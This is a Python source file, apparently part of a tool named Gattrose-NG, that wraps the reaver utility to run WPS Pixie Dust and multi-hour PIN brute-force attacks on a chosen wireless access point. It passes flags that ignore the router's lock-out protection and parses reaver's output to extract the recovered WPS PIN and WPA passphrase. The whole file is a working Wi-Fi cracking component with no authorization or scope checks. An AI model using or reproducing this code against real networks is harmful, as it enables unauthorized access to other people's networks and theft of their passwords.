"""
WPS Attack Service for Gattrose-NG
Executes WPS Pixie Dust and PIN bruteforce attacks using reaver
"""

import subprocess
import re
import time
import threading
from pathlib import Path
from typing import Optional, Callable


class WPSAttackService:
    """Service for executing WPS attacks with reaver"""

    def __init__(self, interface: str):
        self.interface = interface
        self.current_attack = None
        self.reaver_process = None
        self.running = False
        self.progress_callback = None
        self.status_callback = None
        self._lock = threading.Lock()

    def start_pixie_attack(self, bssid: str, channel: str, essid: str = "",
                          progress_callback: Callable = None,
                          status_callback: Callable = None) -> dict:
        """
        Launch Pixie Dust attack with reaver (fast, 2-10 minutes)
        Returns: {'success': bool, 'pin': str, 'psk': str, 'error': str}
        """
        with self._lock:
            if self.running:
                return {'success': False, 'error': 'Attack already in progress'}

            self.running = True
            self.progress_callback = progress_callback
            self.status_callback = status_callback

        print(f"[WPS] Starting Pixie Dust attack on {essid} ({bssid}) channel {channel}")

        try:
            # Prepare output directory
            output_dir = Path("/tmp/gattrose-wps")
            output_dir.mkdir(exist_ok=True)

            # Build reaver command
            cmd = [
                'sudo', 'reaver',
                '-i', self.interface,
                '-b', bssid,
                '-c', channel,
                '-K', '1',  # Pixie Dust mode
                '-vv',      # Very verbose
                '-N',       # Don't send NACK packets
                '-L',       # Ignore locks
                '-f'        # Fixed delay between PIN attempts
            ]

            if self.status_callback:
                self.status_callback(f"Launching Pixie Dust attack on {bssid}...")

            # Start reaver process
            self.reaver_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                text=True,
                bufsize=1
            )

            # Monitor output
            pin = None
            psk = None
            last_status = None

            for line in iter(self.reaver_process.stdout.readline, ''):
                if not self.running:
                    self.reaver_process.terminate()
                    return {'success': False, 'error': 'Attack cancelled'}

                line = line.strip()
                if not line:
                    continue

                print(f"[WPS] {line}")

                # Parse reaver output for status and results
                if "WPS PIN:" in line:
                    match = re.search(r'WPS PIN:\s*["\']?(\d+)["\']?', line)
                    if match:
                        pin = match.group(1)
                        if self.status_callback:
                            self.status_callback(f"✓ PIN found: {pin}")

                if "WPA PSK:" in line:
                    match = re.search(r'WPA PSK:\s*["\']?([^"\']+)["\']?', line)
                    if match:
                        psk = match.group(1)
                        if self.status_callback:
                            self.status_callback(f"✓ PSK found: {psk}")

                # Progress indicators
                if "Sending M2 message" in line:
                    if self.progress_callback:
                        self.progress_callback(20)
                    if self.status_callback and last_status != "m2":
                        self.status_callback("Sending handshake...")
                        last_status = "m2"

                elif "Sending WSC NACK" in line:
                    if self.progress_callback:
                        self.progress_callback(40)
                    if self.status_callback and last_status != "nack":
                        self.status_callback("Processing response...")
                        last_status = "nack"

                elif "Trying pin" in line:
                    match = re.search(r'Trying pin["\']?\s*(\d+)', line)
                    if match and self.status_callback and last_status != "trying":
                        self.status_callback(f"Testing PIN: {match.group(1)}")
                        last_status = "trying"

                # Error detection
                elif "Failed to associate" in line:
                    if self.status_callback:
                        self.status_callback("Warning: Failed to associate, retrying...")

                elif "Receive timeout" in line:
                    if self.status_callback:
                        self.status_callback("Warning: Timeout, retrying...")

            # Wait for process to complete
            self.reaver_process.wait(timeout=600)  # 10 minute timeout for Pixie

            if pin and psk:
                print(f"[WPS] ✓ SUCCESS! PIN: {pin}, PSK: {psk}")
                return {
                    'success': True,
                    'pin': pin,
                    'psk': psk,
                    'method': 'pixie_dust'
                }
            else:
                error_msg = "Pixie Dust failed - network may not be vulnerable"
                print(f"[WPS] {error_msg}")
                return {
                    'success': False,
                    'error': error_msg
                }

        except subprocess.TimeoutExpired:
            if self.reaver_process:
                self.reaver_process.kill()
            return {'success': False, 'error': 'Pixie Dust attack timed out (10 minutes)'}

        except Exception as e:
            print(f"[WPS] Error during Pixie attack: {e}")
            return {'success': False, 'error': str(e)}

        finally:
            self.running = False
            self.reaver_process = None

    def start_pin_bruteforce(self, bssid: str, channel: str, essid: str = "",
                            progress_callback: Callable = None,
                            status_callback: Callable = None,
                            max_runtime: int = 28800) -> dict:
        """
        Launch full PIN bruteforce with reaver (slow, 4-10 hours)
        max_runtime: Maximum runtime in seconds (default 8 hours)
        Returns: {'success': bool, 'pin': str, 'psk': str, 'error': str}
        """
        with self._lock:
            if self.running:
                return {'success': False, 'error': 'Attack already in progress'}

            self.running = True
            self.progress_callback = progress_callback
            self.status_callback = status_callback

        print(f"[WPS] Starting PIN bruteforce on {essid} ({bssid}) channel {channel}")
        print(f"[WPS] Max runtime: {max_runtime // 3600} hours")

        try:
            # Prepare output directory
            output_dir = Path("/tmp/gattrose-wps")
            output_dir.mkdir(exist_ok=True)
            session_file = output_dir / f"reaver_{bssid.replace(':', '')}.wpc"

            # Build reaver command
            cmd = [
                'sudo', 'reaver',
                '-i', self.interface,
                '-b', bssid,
                '-c', channel,
                '-vv',      # Very verbose
                '-N',       # Don't send NACK packets
                '-L',       # Ignore locks
                '-d', '1',  # Delay 1 second between attempts
                '-T', '0.5',  # Timeout after 0.5 seconds
                '-r', '3:15',  # Sleep 15 seconds after 3 failures
                '-s', str(session_file)  # Session file for resume
            ]

            if self.status_callback:
                self.status_callback(f"Launching PIN bruteforce on {bssid}...")

            # Start reaver process
            start_time = time.time()
            self.reaver_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                text=True,
                bufsize=1
            )

            # Monitor output
            pin = None
            psk = None
            pins_tested = 0
            total_pins = 11000  # Approximate total PINs

            for line in iter(self.reaver_process.stdout.readline, ''):
                # Check runtime limit
                if time.time() - start_time > max_runtime:
                    print(f"[WPS] Max runtime reached ({max_runtime // 3600}h), stopping attack")
                    self.reaver_process.terminate()
                    return {
                        'success': False,
                        'error': f'Max runtime reached ({max_runtime // 3600}h)',
                        'pins_tested': pins_tested
                    }

                if not self.running:
                    self.reaver_process.terminate()
                    return {
                        'success': False,
                        'error': 'Attack cancelled by user',
                        'pins_tested': pins_tested
                    }

                line = line.strip()
                if not line:
                    continue

                # Log every 100th line to avoid spam
                if pins_tested % 100 == 0:
                    print(f"[WPS] {line}")

                # Parse results
                if "WPS PIN:" in line:
                    match = re.search(r'WPS PIN:\s*["\']?(\d+)["\']?', line)
                    if match:
                        pin = match.group(1)
                        print(f"[WPS] ✓ PIN FOUND: {pin}")
                        if self.status_callback:
                            self.status_callback(f"✓ PIN found: {pin}")

                if "WPA PSK:" in line:
                    match = re.search(r'WPA PSK:\s*["\']?([^"\']+)["\']?', line)
                    if match:
                        psk = match.group(1)
                        print(f"[WPS] ✓ PSK FOUND: {psk}")
                        if self.status_callback:
                            self.status_callback(f"✓ PSK found: {psk}")

                # Track progress
                if "Trying pin" in line:
                    pins_tested += 1
                    progress = int((pins_tested / total_pins) * 100)
                    if self.progress_callback and pins_tested % 10 == 0:
                        self.progress_callback(min(progress, 99))

                    if pins_tested % 100 == 0 and self.status_callback:
                        self.status_callback(f"Tested {pins_tested}/{total_pins} PINs ({progress}%)")

            # Wait for completion
            self.reaver_process.wait()

            if pin and psk:
                print(f"[WPS] ✓ SUCCESS! PIN: {pin}, PSK: {psk}")
                return {
                    'success': True,
                    'pin': pin,
                    'psk': psk,
                    'method': 'pin_bruteforce',
                    'pins_tested': pins_tested
                }
            else:
                return {
                    'success': False,
                    'error': 'PIN bruteforce failed',
                    'pins_tested': pins_tested
                }

        except Exception as e:
            print(f"[WPS] Error during PIN bruteforce: {e}")
            return {
                'success': False,
                'error': str(e),
                'pins_tested': pins_tested if 'pins_tested' in locals() else 0
            }

        finally:
            self.running = False
            self.reaver_process = None

    def stop_attack(self):
        """Stop current attack"""
        with self._lock:
            self.running = False
            if self.reaver_process:
                try:
                    self.reaver_process.terminate()
                    self.reaver_process.wait(timeout=5)
                except:
                    self.reaver_process.kill()
                print("[WPS] Attack stopped")

    def is_running(self) -> bool:
        """Check if attack is currently running"""
        return self.running
